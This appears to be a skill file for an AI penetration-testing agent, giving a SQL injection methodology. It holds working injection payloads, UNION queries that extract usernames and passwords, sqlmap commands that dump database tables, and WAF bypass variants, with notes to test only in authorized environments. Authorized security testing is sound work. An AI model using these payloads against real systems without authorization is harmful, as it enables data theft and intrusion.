---
name: sql-injection-testing
description: Professional skills and methodology for SQL injection testing
version: 1.0.0
---

# SQL Injection Testing Skill

## Overview

SQL injection is a common and dangerous web application vulnerability. This skill provides a systematic methodology for SQL injection testing, detection techniques, and exploitation strategies.

## Testing Methodology

### 1. Parameter Identification
- Identify all user input points: URL parameters, POST data, HTTP headers, Cookies, etc.
- Focus on parameters such as id, search, filter, and sort
- Use Burp Suite or similar tools to intercept and modify requests

### 2. Basic Detection
- Single-quote test: `'` - check whether an SQL error appears
- Boolean-based blind: `' AND '1'='1` vs `' AND '1'='2`
- Time-based blind: `' AND SLEEP(5)--`
- UNION query: `' UNION SELECT NULL--`

### 3. Database Fingerprinting
- MySQL: `' AND @@version LIKE '%mysql%'--`
- PostgreSQL: `' AND version() LIKE '%PostgreSQL%'--`
- MSSQL: `' AND @@version LIKE '%Microsoft%'--`
- Oracle: `' AND (SELECT banner FROM v$version WHERE rownum=1) LIKE '%Oracle%'--`

### 4. Information Extraction
- Database name: `' UNION SELECT database()--`
- Table names: `' UNION SELECT table_name FROM information_schema.tables--`
- Column names: `' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--`
- Data extraction: `' UNION SELECT username,password FROM users--`

## Tool Usage

### sqlmap
```bash
# 基础扫描
sqlmap -u "http://target.com/page?id=1"

# 指定参数
sqlmap -u "http://target.com/page" --data="id=1" --method=POST

# 指定数据库类型
sqlmap -u "http://target.com/page?id=1" --dbms=mysql

# 获取数据库列表
sqlmap -u "http://target.com/page?id=1" --dbs

# 获取表
sqlmap -u "http://target.com/page?id=1" -D database_name --tables

# 获取数据
sqlmap -u "http://target.com/page?id=1" -D database_name -T users --dump
```

### Manual Testing
- Use Burp Suite's Repeater module
- Use browser developer tools
- Write Python scripts to automate testing

## Bypass Techniques

### WAF Bypass
- Encoding bypass: URL encoding, Unicode encoding, hexadecimal encoding
- Comment bypass: `/**/`, `--`, `#`
- Mixed case: `SeLeCt`, `UnIoN`
- Whitespace substitution: `/**/`, `+`, `%09` (Tab), `%0A` (newline)

### Examples
```
原始：' UNION SELECT NULL--
绕过1：'/**/UNION/**/SELECT/**/NULL--
绕过2：'%55nion%20select%20null--
绕过3：'/*!UNION*//*!SELECT*/null--
```

## Validation and Reporting

### Validation Steps
1. Confirm that SQL statements can be executed
2. Extract database information to verify
3. Assess the impact scope (data leakage, privilege escalation, etc.)
4. Document a complete PoC (request/response)
5. Use the `report_finding` tool to record confirmed vulnerabilities in the platform (the sole entry point for recording vulnerabilities on this platform); fields cover location, type, severity, reproduction steps/PoC, and remediation recommendations

### Reporting Key Points
- Vulnerability location and parameters
- Affected data and systems
- Complete exploitation steps
- Remediation recommendations (parameterized queries, input validation, etc.)

## Notes

- Only test in authorized environments
- Avoid damaging production data
- Use dangerous operations such as DROP and DELETE with caution
- Document all testing steps for reproducibility
